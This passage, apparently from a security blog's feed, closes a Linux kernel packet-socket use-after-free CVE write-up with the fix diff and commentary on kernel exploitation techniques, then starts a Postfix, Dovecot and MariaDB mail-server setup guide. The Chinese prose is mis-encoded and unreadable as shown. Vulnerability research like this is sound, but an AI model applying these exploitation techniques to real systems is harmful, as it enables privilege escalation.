æ®µç›¸åŒçš„æƒé™</p></blockquote><h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03. æ¼æ´ä¿®å¤"></a>0x03. æ¼æ´ä¿®å¤</h1><p>è¿™ä¸ªæ¼æ´æœ€ç»ˆåœ¨ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit?id=ec6af094ea28f0f2dda1a6a33b14cd57e36a9755">è¿™ä¸ª commit</a> å½“ä¸­è¢«ä¿®å¤ï¼Œä¿®å¤æ–¹å¼æ˜¯ï¼š</p><ul><li>å°† <code>rx_owner_map</code> çš„é‡Šæ”¾è¿ç§»åˆ°ä¸ <code>pg_vec</code> åŒæ­¥</li></ul><p>è¿™ç¡®ä¿äº† <code>rx_owber_map</code> ä¸ <code>pg_vec</code> ç”Ÿå‘½å‘¨æœŸçš„ä¸€è‡´æ€§ï¼Œä»è€Œä¸ä¼šè¢«åŒé‡é‡Šæ”¾ï¼Œä¸è¿‡åœ¨ç¬”è€…çœ‹æ¥æ›´è¦ç´§çš„é—®é¢˜æ˜¯ double booking çš„å­˜åœ¨ï¼Œå› æ­¤ç¬”è€…ä¸ªäººå…¶å®ä¸å¤ªæ»¡æ„å¯¹è¿™ä¸ªæ¼æ´çš„ä¿®å¤æ­¢æ­¥äºæ­¤</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/net/packet/af_packet.c b/net/packet/af_packet.c</span><br><span class="hljs-comment">index 46943a18a10d54..76c2dca7f0a594 100644</span><br><span class="hljs-comment">--- a/net/packet/af_packet.c</span><br><span class="hljs-comment">+++ b/net/packet/af_packet.c</span><br><span class="hljs-meta">@@ -4492,9 +4492,10 @@</span> static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,<br> &#125;<br> <br> out_free_pg_vec:<br><span class="hljs-deletion">-bitmap_free(rx_owner_map);</span><br><span class="hljs-deletion">-if (pg_vec)</span><br><span class="hljs-addition">+if (pg_vec) &#123;</span><br><span class="hljs-addition">+bitmap_free(rx_owner_map);</span><br> free_pg_vec(pg_vec, order, req-&gt;tp_block_nr);<br><span class="hljs-addition">+&#125;</span><br> out:<br> return err;<br> &#125;<br></code></pre></td></tr></table></figure><h1 id="0xFF-Whatâ€™s-moreâ€¦"><a href="#0xFF-Whatâ€™s-moreâ€¦" class="headerlink" title="0xFF. Whatâ€™s moreâ€¦"></a>0xFF. Whatâ€™s moreâ€¦</h1><blockquote><p>ä¹…è¿ä½†ç»å…¸çš„åºŸè¯ç¯èŠ‚</p></blockquote><p>å¥½ä¹…æ²¡æœ‰ä»å¤´å†™è¿‡æ¯”è¾ƒç¡¬æ ¸çš„æ¼æ´åˆ†æä¸åˆ©ç”¨çš„æ–‡ç« äº†ï¼ˆ <del>æ˜¯çš„è‡ªä» 23 å¹´æœ¬ç§‘æ¯•ä¸šä¹‹åç¬”è€…å°±å¾ˆå°‘æœ‰æ—¶é—´å»å¯¹ä¸€ä¸ªå†…æ ¸æ¼æ´åšæ·±å…¥é€å½»çš„åˆ†æä¸æ”»å‡»ç¨‹å¼çš„ç¼–å†™äº†ï¼Œè€Œå‰é¢å‡ ç¯‡æ¼æ´åˆ†æå…¶å®éƒ½å¾ˆæ°´å½“ç„¶è¿™ç¯‡ä¹Ÿæ¯”è¾ƒæ°´ä¸è¿‡å«æ°´é‡å¯èƒ½ç¨å¾®å°‘ä¸€ç‚¹æ¯•ç«Ÿåœ¨ exp ä¸­æœ‰ç€ç¬”è€…è®¤ä¸ºéå¸¸æœ‰æ„æ€çš„ä¸€äº›å°æŠ€å·§</del> ï¼‰ï¼Œè¿™åˆè®©ç¬”è€…æƒ³èµ·äº†è‡ªå·±åˆšå­¦ kernel pwn çš„é‚£æ®µæ—¶é—´ï¼š2020å¹´ï½2023å¹´å¯è°“æ˜¯ Linux å†…æ ¸åˆ©ç”¨çš„é£é€Ÿå‘å±•æœŸï¼Œè¿™ä¸ªé˜¶æ®µåœ¨æ— æ•°å®‰å…¨ç ”ç©¶å‘˜çš„å…±åŒåŠªåŠ›ä¸‹ kernel pwn çš„å‘å±•ç›´æ¥å‡»ç©¿äº†ä» SLUB allocator åˆ° buddy system çš„æ¯ä¸€å¤„ç»†èŠ‚ï¼Œä»å¯¹ä¸åŒå†…æ ¸ç»“æ„çš„æ·±å…¥è§£æåˆ°å„ç§è·¨ç¼“å­˜çš„é¡µçº§æ”»å‡»æ‰‹æ®µï¼Œå†åˆ°éšä¹‹è€Œæ¥çš„å„ç§ä¸åŒçš„é˜²æŠ¤ä¸ç¼“è§£æªæ–½ï¼Œ <strong>Linux kernel è¿™ä¸€æˆ˜åœºé—´æ”»é˜²å¯¹æŠ—çš„å‘å±•é€Ÿåº¦ä¼¼ä¹å·²ç»å¿«åˆ°è¿˜æ²¡å¼€å§‹å¤šä¹…å°±å·²ç»ç»“æŸäº†</strong> ï¼Œpage-level heap fengshuiã€cross-cache attackã€ page-level UAF ç­‰æ·±å…¥å†…å­˜ç®¡ç†æœ€åº•å±‚çš„æŠ€æœ¯ä¼¼ä¹ç›´æ¥åœ¨æ”»å‡»æŠ€å·§ä¸Šçªç ´äº†ä»¤äººéš¾ä»¥æƒ³è±¡çš„æé™ï¼ˆDirtyCredã€DirtyPageTable ä¹‹ç±»çš„ä»”ç»†ä¸€æƒ³ä¸éƒ½åªæ˜¯ <em>ä¸åŒå½¢å¼çš„è¡ç”Ÿç‰©</em> ä¹ˆï¼Œæ›´åˆ«æ SLUBStick ä¹‹ç±»çš„æ¢çš®ä»¥åŠ PageJack è¿™æ ·çš„ <strong>æŠ„è¢­</strong> ä¹‹ç‰©äº† <del>ï¼Œæ˜¯çš„ç¬”è€…ä¸€ç›´æœ‰åœ¨å°è¯•å’Œ BlackHat çš„ä¸»åŠæ–¹ argue è¿™ä»¶äº‹æƒ…ï¼Œè™½ç„¶æƒ…å†µå¹¶ä¸ä¹è§‚ä½†æˆ‘ä»ä¼šåšæŒä¸‹å»</del> ï¼‰ï¼Œè€Œ <code>SLAB_VIRTUAL</code> ã€<code>CONFIG_RANDOM_KMALLOC_CACHES</code> ç­‰é˜²æŠ¤æ‰‹æ®µçš„å‡ºç°åˆ™æ›´æ˜¯å¾ˆå¤šä¼ ç»Ÿæ”»å‡»æ–¹æ³•é»¯ç„¶å¤±è‰²ï¼Œåœ¨ 2024 å¹´åšä¸ªæ™®é€šçš„ kernel pwn ä¼¼ä¹å„ç§ data-only attack å·²ç»æ˜¯æ ‡é…ï¼Œæ²¡æœ‰ä¸ªä¸ä¾èµ–ç‰¹å®šå†…æ ¸é•œåƒçš„è¯´æ˜ä¼¼ä¹éƒ½æ‹¿ä¸å‡ºæ‰‹ï¼Œæ”»å‡»ç¨‹å¼é‡Œæ²¡æœ‰ heap spray å°±å¥½åƒåƒé¥­ä¸ç”¨é¤å…·ä¸€æ ·æŠ½è±¡ï¼Œè€Œä¼ ç»Ÿçš„è¿”å›å¯¼å‘ç¼–ç¨‹ä¼¼ä¹æ—©å·²éšç€æ§åˆ¶æµå®Œæ•´æ€§å’Œ shadow stack ä¸ CET ç­‰æŠ€æœ¯çš„å‡ºç°è€Œè¢«æ‰«å…¥å†å²çš„åƒåœ¾å †ï¼Œè™½ç„¶æœ‰ Page-Oriented Programming è¿™æ ·çš„æŠ€æœ¯å¸®åŠ©æ”»å‡»è€…è¿›è¡Œä»£ç æ‰§è¡Œä½†è¦è¾¾åˆ°è¿™æ ·çš„æ”»å‡»æ‰€éœ€æ±‚çš„æƒèƒ½åœ¨å®æˆ˜ä¸­ä¸å¦‚ç›´æ¥è¿›è¡Œ Data-Only Attackï¼Œåƒ userland pwn ä¸€æ ·ä¼ªé€  freelist åˆ†é… fake chunk çš„æ–¹æ³•æ›´æ˜¯æ—©å·²é”€å£°åŒ¿è¿¹â€”â€” <strong>ä½†æ¥ä¸‹æ¥å‘¢ï¼Ÿ</strong></p><p><strong>â€œæˆ‘ä»¬å¥½åƒè¿‡å¿«åœ°çˆ¬åˆ°äº†å±±é¡¶ï¼Œä»¥è‡³äºçªç„¶å˜å¾—æ— äº‹å¯åšã€‚â€</strong> äºæ˜¯åœ¨å„ç§é«˜çº§å†…æ ¸åˆ©ç”¨æŠ€å·§äº•å–·å¼çˆ†å‘çš„ 2021 ï½ 2023 å¹´ç»“æŸä¹‹åï¼Œ <strong>æˆ‘ä»¬ä¼šå‘ç° 2024 è¿™ä¸€å¹´å¥½åƒå‡ ä¹æ²¡æœ‰ä»€ä¹ˆæ–°çš„ä¸œè¥¿èƒ½ç©äº†</strong> ï¼Œè¿™ä¸€å¹´çš„å„å¤§å®¶ä¼¼ä¹éƒ½åœ¨æ²‰å¯‚å½“ä¸­ï¼ˆ <del>å½“ç„¶ç¬”è€…ä¹Ÿä»€ä¹ˆéƒ½æ²¡å‘æ˜¯å› ä¸ºç¬”è€…æœ¬æ¥å°±èœå—·</del> ï¼‰ï¼Œå¤§å®¶å¥½åƒæ²¡æœ‰ä»€ä¹ˆå€¼å¾—æ‹¿å‡ºæ¥ä¿®çš„èŠ±æ´»äº†ï¼ˆ <strong>é™¤äº† PageSpray æ˜¯ç¬”è€…è§‰å¾—ç¡®å®ç®—æ˜¯æ–°çš„æœ‰ç”¨çš„ä¸œè¥¿</strong> ï¼Œä½†ä¼—æ‰€å‘¨çŸ¥ <strong>24å¹´å‘çš„è®ºæ–‡23å¹´å°±å†™å¥½äº†</strong> ï¼ŒåŒæ ·åœ° 24 å¹´ Usenix å‘çš„ Page-Oriented Programming ä¹Ÿåœ¨ 23 å¹´å°±ä¸Šäº† BlackHatï¼‰ï¼Œè¿™ä¸€å¹´æ˜é¢ä¸Šçš„äº§å‡ºä¼¼ä¹åªæœ‰ä¸€äº›æ–°ç“¶è£…æ—§é…’çš„è®ºæ–‡å’Œå‰½çªƒæŠ„è¢­æ´—ç¨¿ä¹‹ç‰©ï¼Œ <strong>åœ¨ kernel exploitation ä¸Šå’±ä»¬å¥½åƒçœ‹ä¸åˆ°ä»€ä¹ˆæœ¬è´¨ä¸Šæ–°çš„ä¸œè¥¿äº†</strong> ï¼ˆ <del>ä¹Ÿå¯èƒ½æ˜¯ç¬”è€…è§è¯†çŸ­æµ…ï¼Œè°çŸ¥é“å‘¢</del> ï¼‰ï¼Œå¤§å®¶èƒ½åšçš„ä¼¼ä¹å°±åªæ˜¯å†ç¿»ä¸€ç¿»è¿˜æœ‰æ²¡æœ‰åŸ‹è—åœ¨æ²™å­å½“ä¸­æ²¡è¢«å‘ç°çš„çç ï¼ˆå†…æ ¸ç»“æ„ä½“ï¼‰ï¼Œä»¥åŠæ„Ÿå¹ç‰©èµ„çš„æŸåå¦‚æ­¤ä¹‹å¿«ï¼ˆé€å»çš„ <code>io_uring</code> çš„ 4k èœå•å †ï¼‰</p><p>â€”â€”å½“ç„¶ï¼Œä»¥ 2025 å¹´çš„çœ¼å…‰é‡æ–°å®¡è§†å½“å¹´æ·³æœ´çš„ USMAï¼Œæˆ‘ä»¬ä¼šå‘ç°å’Œç¬”è€…åœ¨ç¬¬ä¸€ä»½ exp å½“ä¸­ç»™å‡ºçš„æˆç†Ÿçš„ç°ä»£å†…æ ¸æ”»å‡»æŠ€æœ¯ç›¸æ¯”ï¼Œå¼ºä¾èµ–äºç‰¹å®šå†…æ ¸é•œåƒçš„ USMA ä¼¼ä¹å¹¶ä¸æ˜¯ä¸€ä¸ªå¤šä¹ˆ powerful çš„æŠ€æœ¯ï¼Œä½†ä¸å¾—ä¸è¯´çš„æ˜¯ <strong>åœ¨ 2022 å¹´çš„æ—¶å€™è¿™ç¡®ä¹æ˜¯ä¸€ä¸ªéå¸¸äº®çœ¼çš„æŠ€æœ¯</strong> ï¼Œæ¯•ç«Ÿåœ¨æ­¤ä¹‹å‰æ²¡æœ‰äººæ›¾ç»æƒ³è¿‡é¡µé¢æ˜ å°„æœºåˆ¶ä¹Ÿèƒ½å¤Ÿæ‹¿æ¥åšå¦‚æ­¤ç²¾å¦™çš„æ”»å‡»ï¼Œè€Œè¿™ä¹Ÿä¸ºåé¢å‡ºç°çš„ DirtyPageTable ä»¥åŠ SLUBStick ç­‰æŠ€æœ¯æä¾›äº†æŒ‡å¯¼</p><p>è€Œ USMA åˆä¸€å®šè¦ä¾èµ–äºç‰¹å®šçš„å†…æ ¸é•œåƒå—ï¼Ÿç­”æ¡ˆä¼¼ä¹ä¹Ÿå¹¶éå¦‚æ­¤ï¼Œé€šè¿‡å„ç§å†…æ ¸å¯¹è±¡å„ç§å†…æ ¸å‡½æ•°è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥æ³„æ¼å‡ºåå­—å’ŒåŠŸèƒ½å·²çŸ¥çš„å†…æ ¸å‡½æ•°çš„åœ°å€ï¼Œè¿™æ— å…³äºå†…æ ¸é•œåƒçš„å†…éƒ¨æ„é€ ï¼Œå†é…ä¸Šåˆé€‚çš„å‚æ•°åˆ—è¡¨ä¸ç‰¹å®šæ„é€ çš„ shellcodeï¼Œ <strong>æˆ‘ä»¬å…¶å®æ˜¯æœ‰åŠæ³•å°† USMA è½¬æ¢ä¸ºé€šç”¨æ”»å‡»æ–¹æ³•çš„</strong> â€”â€”æ„Ÿå…´è¶£çš„è¯»è€…æ¬¢è¿å“å° <a href="https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/">ç”± veritas501 å¸ˆå‚…ç»™å¤§å®¶å¸¦æ¥çš„å¤§é¤</a></p><p>2018 å¹´çš„æˆ‘ä»¬è¿˜åœ¨åƒåŠ›åœ°ç”¨å„ç§å†…æ ¸å¯¹è±¡æ‹¼å‡‘è¿”å›å¯¼å‘ç¼–ç¨‹ï¼Œè€Œ 2023 å¹´çš„æˆ‘ä»¬å·²ç»å…¨é¢è½¬å‘æ³›ç”¨æ€§ä¸ç¨³å®šæ€§é«˜è´¨é‡å‘å±•çš„ç°ä»£å†…æ ¸åˆ©ç”¨æŠ€å·§ï¼Œè€Œè¿™ <strong>ç¦»ä¸å¼€æ‰€æœ‰å®‰å…¨ç ”ç©¶å‘˜ä»¬çš„å…±åŒåŠªåŠ›</strong> ï¼Œçºµä½¿ç°åœ¨è¿›å…¥äº†çŸ­æš‚çš„æ²‰å¯‚æœŸï¼Œä½†ç¬”è€…ç›¸ä¿¡æ€»ä¼šæœ‰æ‹”äº‘è§æ—¥çš„é‚£ä¸€å¤©</p><blockquote><p>æ‡’å¾—å†™äº†ï¼Œæ‘†çƒ‚ï¼</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;Packet Socket ç¬‘ä¼ ä¹‹åˆ›æ¬¡buffer&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://arttnba3.github.io/categories/CVE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="CVE" scheme="https://arttnba3.github.io/tags/CVE/"/>
    
    <category term="ææƒ" scheme="https://arttnba3.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Packet Socket" scheme="https://arttnba3.github.io/tags/Packet-Socket/"/>
    
  </entry>
  
  <entry>
    <title>ã€OPS.0x05ã€‘ç”¨Postfix+Dovecat+MariaDBæ­å»ºé‚®ä»¶ç³»ç»Ÿ</title>
    <link href="https://arttnba3.github.io/2025/03/27/OPS-0X05-POSTFIX_DOVECOT_MARIADB_DEBIAN/"/>
    <id>https://arttnba3.github.io/2025/03/27/OPS-0X05-POSTFIX_DOVECOT_MARIADB_DEBIAN/</id>
    <published>2025-03-27T08:23:45.000Z</published>
    <updated>2025-04-13T15:38:26.178Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨ Debian ä¸Šç”¨ MySQL è·Ÿâ„¢æ€äººäº†ä¸€æ ·</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>ä¸€åˆ‡è¯´æ¥è¯é•¿ä½†é•¿è¯çŸ­è¯´ï¼Œæ€»è€Œè¨€ä¹‹ç¬”è€…æ­£åœ¨æ­å»ºä¸€ä¸ªç‹¬ç«‹å¯ç”¨çš„é‚®ä»¶ç³»ç»Ÿï¼Œå› ä¸ºæœ‰ä¸€ä¸ªè‡ªå·±çš„åŸŸåä½œä¸ºåç¼€æ¥å‘é€é‚®ä»¶çš„é‚®ç®±æ˜¯éå¸¸ç‚«é…·çš„ä¸€ä»¶äº‹æƒ…ï¼ˆï¼Ÿï¼‰</p><p>åœ¨æŠ€æœ¯é€‰å‹ä¸Šç¬”è€…ç»è¿‡è€ƒè™‘ä¹‹åè¿˜æ˜¯é€‰æ‹©ä¼ ç»Ÿçš„ Postfix + Dovecot + MariaDB æ–¹æ¡ˆï¼Œå› ä¸ºè¿™æ˜¯è¢«å¹¿æ³›åº”ç”¨åœ¨å„ä¸ªä¼ä¸šå½“ä¸­çš„æˆç†Ÿè§£å†³æ–¹æ¡ˆï¼Œè‡³äºä¸ºä»€ä¹ˆé€‰æ‹© MariaDB è€Œä¸æ˜¯ MySQL åˆ™æ˜¯å› ä¸ºç¬”è€…æœåŠ¡å™¨ä½¿ç”¨çš„ Debian å‘è¡Œç‰ˆå¯¹ MySQL çš„æ”¯æŒä¸å¤ªå¥½ï¼Œå¯¼è‡´é…ç½®è¿‡ç¨‹ä¸­å‡ºç°äº†ä¸€ç³»åˆ—äº‹æ•…ï¼Œä½¿å¾—ç¬”è€…æœ€ç»ˆè½¬å‘ Debian æ¨èçš„ MariaDB :ï¼ˆ</p><p>è¯ä¸å¤šè¯´ï¼Œä¸‹é¢æˆ‘ä»¬æ¥çœ‹é…ç½®è¿‡ç¨‹ï¼šï¼‰</p><blockquote><p>è‡³äºé‚®ä»¶ç³»ç»Ÿç›¸å…³åŸç†è¿˜æœ‰ SMTPã€IMAP åè®®ä¸€ç±»çš„å°±ä¸æ˜¯è¿™ç¯‡åšå®¢æ‰€åŒ…å«çš„å†…å®¹äº†ï¼Œè¯·åŒå­¦ä»¬è¯¾åè‡ªè¡Œäº†è§£</p></blockquote><h1 id="0x01-é‚®ä»¶ç³»ç»Ÿæ­å»º"><a href="#0x01-é‚®ä»¶ç³»ç»Ÿæ­å»º" class="headerlink" title="0x01. é‚®ä»¶ç³»ç»Ÿæ­å»º"></a>0x01. é‚®ä»¶ç³»ç»Ÿæ­å»º</h1><p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ä¼ ç»Ÿçš„ Postfix + Dovecot æ–¹æ¡ˆï¼ŒæœåŠ¡å™¨ç”¨çš„æ˜¯ç¬”è€…ä¹‹å‰å±¯çš„ä¸€å°ä¾¿å®œ Debian VPS</p><h2 id="DNS-é…ç½®"><a href="#DNS-é…ç½®" class="headerlink" title="DNS é…ç½®"></a>DNS é…ç½®</h2><p>æˆ‘ä»¬ä¸»è¦éœ€è¦æ·»åŠ ä¸‰æ¡è®°å½•ï¼š</p><ul><li>A è®°å½•ï¼šé‚®ä»¶æœåŠ¡å™¨çš„åŸŸåï¼ŒæŒ‡å‘é‚®ä»¶æœåŠ¡å™¨çš„ IPï¼Œä¸€èˆ¬å¯ä»¥æ˜¯ <code>mail.ä¸»åŸŸå</code> </li><li>MX è®°å½•ï¼šæŒ‡å‘é‚®ä»¶æœåŠ¡å™¨çš„åŸŸåï¼ˆä¸Šé¢çš„ A è®°å½•ï¼‰ï¼Œç”¨äºè®¾å®šé‚®ä»¶äº¤ç»™å“ªä¸ªæœåŠ¡å™¨å¤„ç†ï¼Œä¾‹å¦‚åç§°è®¾ä¸º <code>mail</code> ã€å†…å®¹è®¾ä¸º <code>mail-server.åŸŸå</code> åˆ™æ„å‘³ç€ <code>mail.åŸŸå</code> çš„é‚®ä»¶äº¤ç»™ <code>mail-server.åŸŸå</code> å¤„ç†ï¼›è¿™é‡Œç¬”è€…çš„é€‰æ‹©æ˜¯å°† <code>ä¸»åŸŸå</code> çš„é‚®ä»¶äº¤ç»™  <code>mail.ä¸»åŸŸå</code> å¤„ç†</li><li>TXT(SPF) è®°å½•ï¼šå‘ä¿¡ä½¿ç”¨ï¼Œç”¨äºè¯æ˜è¯¥ IP é€å‡ºçš„è¯¥ domain çš„ä¿¡ä¸æ˜¯ä¼ªé€ çš„ï¼Œå†…å®¹åº”å½“ä¸º <code>v=spf1 ip4:æœåŠ¡å™¨IP -all</code></li></ul><p><img src="https://s2.loli.net/2025/03/25/63LiwxjCz1QgldU.png"></p><h2 id="å®‰è£…-MariaDB"><a href="#å®‰è£…-MariaDB" class="headerlink" title="å®‰è£… MariaDB"></a>å®‰è£… MariaDB</h2><p>é¦–å…ˆå®‰è£… MariaDBï¼Œç”¨æ¥å­˜æ”¾é‚®ä»¶å’Œç”¨æˆ·æ•°æ®</p><blockquote><p>æ³¨æ„è¿™é‡Œ <strong>æåº¦ä¸æ¨èä½¿ç”¨ MySQLï¼Œå› ä¸ºä¼šé‡åˆ°éå¸¸éš¾ä»¥è§£å†³çš„é—®é¢˜</strong> ï¼Œ<del>åœ¨ Debian ä¸Šç”¨ MySQL è·Ÿâ„¢æ€äººäº†ä¸€æ ·</del></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install mariadb-server mariadb-client</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥ä½¿ç”¨äº†</p><h2 id="åœ¨-MariaDB-ä¸­åˆ›å»ºå¯¹åº”çš„æ•°æ®åº“"><a href="#åœ¨-MariaDB-ä¸­åˆ›å»ºå¯¹åº”çš„æ•°æ®åº“" class="headerlink" title="åœ¨ MariaDB ä¸­åˆ›å»ºå¯¹åº”çš„æ•°æ®åº“"></a>åœ¨ MariaDB ä¸­åˆ›å»ºå¯¹åº”çš„æ•°æ®åº“</h2><p>é¦–å…ˆç™»å½• root è´¦æˆ·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mariadb -u root</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®åº“å¹¶ä½¿ç”¨ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> DATABASE IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> mail_db;<br>USE mail_db;<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªè¡¨å­˜æ”¾è®¤è¯çš„åŸŸåï¼Œå¹¶æ’å…¥ä¸€æ¡æ–°è®°å½•ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"># åˆ›å»ºä¸€ä¸ªè¡¨<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `virtual_domains` (<br>    `id`  <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>    `name` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">256</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-keyword">PRIMARY</span> KEY (`id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8;<br><br># æ·»åŠ åŸŸå<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> virtual_domains <span class="hljs-keyword">VALUE</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;test.com&#x27;</span>);<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªè¡¨å­˜æ”¾é‚®ç®±ä¸å¯†ç ï¼ˆæ¨èå­˜æ”¾å“ˆå¸Œå€¼ï¼Œä¾‹å¦‚ä½¿ç”¨ sha256ï¼‰ï¼Œå¹¶æ·»åŠ ä¸Šä¸€ä¸ªç”¨æˆ·ï¼Œæ³¨æ„è¿™é‡Œçš„ <code>domain_id</code> ä¸ºå‰é¢çš„è¡¨ä¸­åŸŸåçš„åºå·ï¼ˆä¸‹åŒï¼‰ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"># åˆ›å»ºä¸€ä¸ªè¡¨<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `virtual_users` (<br>`id` <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>`domain_id` <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>`password` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>`email` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">256</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br><span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br><span class="hljs-keyword">UNIQUE</span> KEY `email` (`email`),<br><span class="hljs-keyword">FOREIGN</span> KEY (domain_id) <span class="hljs-keyword">REFERENCES</span> virtual_domains(id) <span class="hljs-keyword">ON</span> <span class="hljs-keyword">DELETE</span> CASCADE<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8;<br><br># åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> virtual_users <span class="hljs-keyword">VALUE</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, &quot;åç»­ä½¿ç”¨doveadm pw -s SHA256-CRYPT -p &#x27;å¯†ç &#x27; åˆ›å»ºçš„å¯†ç &quot;, &quot;arttnba3@test.com&quot;);<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªè¡¨å­˜æ”¾é‚®ç®±åˆ«åï¼Œä¸»è¦ç”¨äºé‚®ä»¶è½¬å‘ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"># åˆ›å»ºä¸€ä¸ªè¡¨<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `virtual_aliases` (<br>    `id` <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> auto_increment,<br>    `domain_id` <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    `source` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">256</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    `destination` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">256</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>    <span class="hljs-keyword">FOREIGN</span> KEY (domain_id) <span class="hljs-keyword">REFERENCES</span> virtual_domains(id) <span class="hljs-keyword">ON</span> <span class="hljs-keyword">DELETE</span> CASCADE<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8;<br><br># 